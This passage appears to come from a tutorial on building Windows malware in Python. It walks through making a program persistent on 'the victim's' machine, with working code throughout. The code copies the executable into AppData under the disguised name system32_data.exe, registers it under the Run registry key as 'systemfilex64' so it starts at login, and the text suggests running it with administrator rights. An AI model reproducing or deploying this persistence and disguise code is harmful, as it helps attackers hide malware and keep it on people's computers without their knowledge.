You can see that now we are getting the actual executable name that we need. The next step is to create a copy of this executable and store it somewhere else so that it is hidden from the victim and finally add a registry to the start up applications.

We will copy this executable to the AppData folder on Windows, which is a special folder that contains application data. To get the path of the appdata folder, you can write the following code:

```
app_data = os.getenv("APPDATA")
```

Let's rename the executable so it doesn't look suspicious. We will call this executable system32_data.exe. This is a made-up name and you can use any name you want:

```
to_save_file = app_data +"\\"+"system32_data.exe"
```

Next, copy the current executable to appdata and rename it. We will need to import the shutil module from the Python standard library:

```
shutil.copyfile(curr_executable, to_save_file)
```

To add it to the Windows registry at startup, you need to run the following code:

```
key = winreg.HKEY_CURRENT_USER
# "Software\Microsoft\Windows\CurrentVersion\Run"
key_value = "Software\\Microsoft\\Windows\\
CurrentVersion\\Run"
key_obj = winreg.OpenKey(key, key_value, 0, winreg.
KEY_ALL_ACCESS)
winreg.SetValueEx(key_obj, "systemfilex64", 0, winreg.
REG_SZ, to_save_file)
winreg.CloseKey(key_obj)
```

This code simply adds the to_save_file string, which contains the executable name to the start up registry.

To make changes to the program, you need to run this executable in administrator mode, so you can copy the code from the previous section and add it to the start of this script. The complete code is linked here:

```
if not os.path.exists(to_save_file):
    print("Becoming Persistent")
    shutil.copyfile(curr_executable, to_save_file)
    key = winreg.HKEY_CURRENT_USER
```